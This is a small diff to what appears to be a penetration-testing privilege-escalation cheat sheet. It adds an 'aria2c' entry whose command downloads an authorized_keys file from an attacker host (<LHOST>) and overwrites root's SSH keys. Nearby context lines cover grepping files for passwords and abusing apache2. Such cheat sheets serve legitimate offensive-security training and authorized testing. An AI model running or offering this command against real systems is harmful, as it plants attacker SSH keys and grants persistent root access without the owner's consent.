@@ -3302,6 +3302,12 @@ grep -v "^[#;]" /PATH/TO/FILE | grep -v "^$"    // grep for passwords like "DBPa
 sudo /usr/sbin/apache2 -f <FILE>
 ```
 
+##### arua2c
+
+```c
+aria2c -d /root/.ssh/ -o authorized_keys "http://<LHOST>/authorized_keys" --allow-overwrite=true
+```
+
 ##### Bash Debugging Mode
 
 - Bash <4.4
